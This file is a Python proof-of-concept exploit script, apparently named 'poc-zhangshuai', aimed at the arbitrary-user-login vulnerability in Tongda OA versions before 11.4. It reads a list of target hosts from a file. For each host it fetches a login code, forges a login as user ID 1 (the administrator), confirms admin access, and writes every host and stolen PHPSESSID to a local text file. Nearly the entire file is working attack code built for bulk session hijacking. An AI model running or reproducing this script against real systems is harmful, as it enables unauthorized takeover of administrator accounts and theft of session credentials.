

import requests
import time
import re
import sys
from random import choice
from pyfiglet import Figlet
from rich.console import Console

RED = '\x1b[1;91m'
CYAN = '\033[1;36m'
GREEN = '\033[1;32m'
BOLD = '\033[1m'
END = '\033[0m'
console = Console()
s = requests.session() # 初始化requests.session()会话对象，保持cookie

def getSession(host): # 通达<V11.4任意用户登录获取cookie
    print(CYAN + '[->] 正在检测通达<V11.4任意用户登录获取cookie' + END)
    checkUrl = host+'/general/login_code.php'
    print(checkUrl)
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.360'
    }
    try:
        res = requests.get(checkUrl,headers=headers)
        resText = str(res.text).split('{')
        codeUid = resText[-1].replace('}"}', '').replace('\r\n', '')
        getSessUrl = host+'/logincheck_code.php'
        res = requests.post(
            getSessUrl, data={'CODEUID': '{'+codeUid+'}', 'UID': int(1)},headers=headers)
        tmp_cookie = res.headers['Set-Cookie']
        PHPSESSION = re.findall(r'PHPSESSID=(.*?);',str(res.headers))[0]
        headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.360',
        'Cookie': tmp_cookie
    }
        check_available = requests.get(host + '/general/index.php',headers=headers)
        if '用户未登录' not in check_available.text:
            if '重新登录' not in check_available.text:
                print(GREEN + '[*] 成功获得管理员cookie:PHPSESSID=' + PHPSESSION + '\n',sep='' + END)
                with open("45678.txt", "a") as fp:
                    fp.write(host+'\n')
                    fp.write(PHPSESSION+'\n')
        else:
            print(RED +'[-] 未能获取管理员cookie\n' + END)

    except:
        print(RED + '[-] 不存在该漏洞\n' + END)


def run(host):
    getSession(host)
def main():
    file = sys.argv[1]
    with open(file) as f:
        for line in f.readlines():
            host= line.strip()
            run(host)



if __name__ == '__main__':
    console.print(Figlet(font='slant').renderText('poc-zhangshuai'), style='magenta') #定义宽字体且为紫色
    console.print('         版本:<11.4    \n', style='red')
    main()